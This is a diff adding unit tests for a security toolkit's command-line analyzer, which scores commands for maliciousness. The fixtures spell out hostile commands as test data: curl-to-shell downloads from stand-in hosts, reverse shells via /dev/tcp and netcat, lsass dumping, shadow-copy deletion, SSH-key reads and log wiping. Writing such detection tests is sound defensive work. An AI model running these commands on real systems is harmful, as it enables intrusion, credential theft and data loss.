@@ -756,6 +756,177 @@ async function main() {
     assert.strictEqual(Object.keys(toolkit._enrichmentRemainder).length, 0, 'draining an empty remainder is a no-op');
   });
 
+  // ==================== Command Line Analyzer (real SOCToolkit rules) ====================
+  console.log('\n--- Command Line Analyzer Tests ---');
+
+  await test('cmdline: benign admin commands match nothing', () => {
+    for (const text of ['ipconfig /all', 'git status', 'dir C:\\Users', 'echo hello world']) {
+      const r = toolkit.analyzeCommandLine(text);
+      assert.strictEqual(r.matched.length, 0, `"${text}" should match no rules: ` +
+        r.matched.map((m) => m.id).join(','));
+      assert.strictEqual(r.verdict, 'clean');
+    }
+  });
+
+  await test('cmdline: encoded PowerShell is high risk', () => {
+    const r = toolkit.analyzeCommandLine('powershell -nop -w hidden -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA');
+    assert.ok(r.matched.some((m) => m.id === 'ps-encodedcommand'), 'encodedcommand rule must fire');
+    assert.ok(r.matched.some((m) => m.id === 'ps-stealth-flags'), 'stealth flags rule must fire');
+    assert.strictEqual(r.verdict, 'suspicious');
+  });
+
+  await test('cmdline: caret-split curl|bash is caught after normalization', () => {
+    const r = toolkit.analyzeCommandLine('c^u^r^l -s http://evil.example/x.sh | b^a^s^h');
+    assert.ok(r.matched.some((m) => m.id === 'curl-pipe-shell'), 'curl|bash must match through carets');
+    assert.ok(r.findings.some((f) => /caret/i.test(f.title)), 'caret obfuscation must be reported');
+    assert.strictEqual(r.verdict, 'malicious');
+  });
+
+  await test('cmdline: camelCase IEX download cradle is caught', () => {
+    const r = toolkit.analyzeCommandLine("iNvOkE-eXpReSsIoN (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')");
+    assert.ok(r.matched.some((m) => m.id === 'ps-iex'), 'IEX must match case-insensitively');
+    assert.ok(r.matched.some((m) => m.id === 'webclient-download'), 'download cradle must match');
+    assert.ok(r.findings.some((f) => /mixed-case/i.test(f.title)), 'mixed-case spelling must be reported');
+    assert.strictEqual(r.verdict, 'malicious');
+  });
+
+  await test('cmdline: certutil staging from TEMP matches two rules', () => {
+    const r = toolkit.analyzeCommandLine('certutil -urlcache -f http://evil.example/p.exe %TEMP%\\p.exe');
+    assert.ok(r.matched.some((m) => m.id === 'certutil-fetch'));
+    assert.ok(r.matched.some((m) => m.id === 'exec-from-userdir'));
+    // One high + one medium stays below the high-risk bar: suspicious.
+    assert.strictEqual(r.verdict, 'suspicious');
+  });
+
+  await test('cmdline: bash reverse shell via /dev/tcp', () => {
+    const r = toolkit.analyzeCommandLine('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');
+    assert.ok(r.matched.some((m) => m.id === 'reverse-shell-tcp'));
+    assert.strictEqual(r.verdict, 'suspicious');
+  });
+
+  await test('cmdline: curl|bash is critical', () => {
+    const r = toolkit.analyzeCommandLine('curl -sSL https://get.evil.example/x | sudo bash');
+    assert.ok(r.matched.some((m) => m.id === 'curl-pipe-shell' && m.sev === 'critical'));
+    assert.strictEqual(r.verdict, 'malicious');
+  });
+
+  await test('cmdline: schtasks persistence from Public dir', () => {
+    const r = toolkit.analyzeCommandLine('schtasks /create /tn upd /tr C:\\Users\\Public\\u.exe /sc onlogon');
+    assert.ok(r.matched.some((m) => m.id === 'schtasks-create'));
+    // High + medium: suspicious, not high risk — a scheduled task alone can be admin work.
+    assert.strictEqual(r.verdict, 'suspicious');
+  });
+
+  await test('cmdline: single medium signal lands on review, not suspicious', () => {
+    const r = toolkit.analyzeCommandLine('klist purge');
+    assert.ok(r.matched.some((m) => m.id === 'kerberos-purge'));
+    assert.strictEqual(r.verdict, 'review', 'one medium hit is review-level');
+  });
+
+  await test('cmdline: looksLikeCommandLine gates the auto-offer', () => {
+    assert.strictEqual(toolkit.looksLikeCommandLine('powershell -command Get-Process'), true);
+    assert.strictEqual(toolkit.looksLikeCommandLine('curl http://evil.example/x | bash'), true);
+    assert.strictEqual(toolkit.looksLikeCommandLine('c^u^r^l -s http://x'), true);
+    assert.strictEqual(toolkit.looksLikeCommandLine('Contact admin@example.com about invoice 42'), false);
+    assert.strictEqual(toolkit.looksLikeCommandLine('short'), false);
+  });
+
+  await test('cmdline: plain -e flag is not an encoded PowerShell match', () => {
+    // 16+ base64 chars after the flag are required, so ordinary -e use stays clean.
+    const r = toolkit.analyzeCommandLine('curl -e https://referer.example http://example.com/file');
+    assert.ok(!r.matched.some((m) => m.id === 'ps-encodedcommand'),
+      'plain -e must not trigger the encodedcommand rule');
+  });
+
+  await test('cmdline: finding carries pivot IOCs with OSINT links', () => {
+    const r = toolkit.analyzeCommandLine("IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')");
+    const cradle = r.matched.find((m) => m.id === 'cradle-combo');
+    assert.ok(cradle, 'cradle must match');
+    assert.ok(cradle.iocs.some((i) => i.value.includes('evil.example')),
+      'URL/domain near the cradle must be attached to the finding: ' + JSON.stringify(cradle.iocs));
+    // The links shown are the same ones the IOC rows use.
+    const links = toolkit.generateOSINTLinks('evil.example', 'domain');
+    assert.ok(links.length >= 3, 'OSINT links must exist for the domain');
+  });
+
+  await test('cmdline: UTF-16LE encoded payload is decoded and analyzed', () => {
+    const payload = 'iex (New-Object Net.WebClient).DownloadString("http://evil.example/a.ps1")';
+    const b64 = Buffer.from(payload, 'utf16le').toString('base64');
+    const r = toolkit.analyzeCommandLine('powershell -encodedcommand ' + b64);
+    assert.ok(r.findings.some((f) => /Decoded Base64/i.test(f.title)), 'decoded-payload finding must appear');
+    assert.ok(r.matched.some((m) => m.id === 'cradle-combo'), 'rules must match through the decoded payload');
+    assert.strictEqual(r.verdict, 'malicious');
+    assert.ok(r.iocs.some((i) => i.value.includes('evil.example')), 'decoded IOC must reach the pivot list');
+  });
+
+  await test('cmdline: plain URL input yields indicators with no findings', () => {
+    const r = toolkit.analyzeCommandLine('start http://example.com/page');
+    assert.strictEqual(r.matched.length, 0, 'start + URL is not a finding');
+    assert.strictEqual(r.verdict, 'clean');
+    assert.ok(r.iocs.length >= 1, 'URL must still be offered as a pivot');
+  });
+
+  // Inert demo blob: documentation-only indicators (example.invalid,
+  // 192.0.2.0/24), every technique spelled out once. Pasting it into the
+  // analyzer must fire the whole rule bank — a new rule that this blob
+  // misses has no fixture and probably no test either.
+  const inertCmdlineBlob = [
+    'cmd /c powershell -nop -w hidden -encodedcommand ' + Buffer.from('Write-Host "inert demo payload - nothing executes" '.repeat(6).trim(), 'utf16le').toString('base64'),
+    'iNvOkE-eXpReSsIoN (New-Object Net.WebClient).DownloadString("http://cdn.example.invalid/p.ps1")',
+    '[System.Convert]::FromBase64String("aGVsbG8=")',
+    'Invoke-WebRequest http://stage.example.invalid/a.ps1 | iex',
+    'iex ("Wr"+"apper")',
+    'I`n`voke-Expression demo',
+    'certutil -urlcache -f http://stage.example.invalid/p.exe %TEMP%\\p.exe',
+    'bitsadmin /transfer j http://stage.example.invalid/j.exe %TEMP%\\j.exe',
+    'msiexec /q /i http://stage.example.invalid/m.msi',
+    'mshta javascript:window.close',
+    'rundll32 javascript:"..\\..\\demo"',
+    'rundll32 url.dll,OpenURL http://stage.example.invalid',
+    'regsvr32 /i:http://stage.example.invalid/s.sct scrobj.dll',
+    'wmic process call create x.exe',
+    'installutil /logfile= u.dll',
+    'wscript //b //nologo s.js',
+    'schtasks /create /tn t /tr %TEMP%\\t.exe /sc onlogon',
+    'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v v /d %TEMP%\\v.exe',
+    'vssadmin delete shadows /all /quiet',
+    'bcdedit /set {default} recoveryenabled no',
+    'procdump -ma lsass.exe lsass.dmp',
+    'net user svc_backup Passw0rd! /add',
+    'whoami /all & systeminfo & net view & tasklist /v & nltest /domain_trusts & dsquery user',
+    'klist purge',
+    'CuRl -s http://stage.example.invalid/x.sh | sudo bash',
+    'wget -qO- http://stage.example.invalid/y.sh | sh',
+    'c^u^r^l -s http://stage.example.invalid/z.sh | b^a^s^h',
+    'bash -i >& /dev/tcp/192.0.2.10/4444 0>&1',
+    'nc -e /bin/sh 192.0.2.10 4444',
+    'echo aGVsbG8= | base64 -d | sh',
+    'printf 6869 | xxd -r -p | sh',
+    "python -c \"import base64;exec(base64.b64decode('aGVsbG8='))\"",
+    'chmod +x /tmp/x.sh && /dev/shm/run.sh',
+    'crontab -e && systemctl enable demo && cat /etc/rc.local && ls /etc/cron.d/',
+    'cat ~/.ssh/id_rsa > /dev/null',
+    'curl -s http://stage.example.invalid/b -o /usr/bin/b',
+    'history -c ; shred -u ~/.bash_history ; unset HISTFILE',
+    'REM ' + Buffer.from('SAMPLE').toString('base64').replace(/=+$/, '').repeat(80),
+  ].join('\n');
+
+  await test('cmdline: inert demo blob fires every rule in the bank', () => {
+    const r = toolkit.analyzeCommandLine(inertCmdlineBlob);
+    const fired = new Set(r.matched.map((m) => m.id));
+    const missing = toolkit.CMDLINE_RULES.filter((rule) => !fired.has(rule.id)).map((rule) => rule.id);
+    assert.strictEqual(missing.join(','), '', 'rules without a fixture');
+    assert.strictEqual(r.verdict, 'malicious');
+    assert.strictEqual(r.score, 100);
+    // Every obfuscation finding plus the decoded-payload block.
+    for (const title of ['Caret insertion', 'Backtick escaping', 'Mixed-case spelling', 'Decoded Base64 payload']) {
+      assert.ok(r.findings.some((f) => f.title.startsWith(title)), title + ' finding missing');
+    }
+    assert.ok(r.iocs.length >= 5, 'blob must yield pivot indicators');
+  });
+
+  console.log(' [PASS] Command Line Analyzer');
+
   console.log('\nTest Summary:');
   console.log('  Passed:', passed);
   console.log('  Failed:', failed);
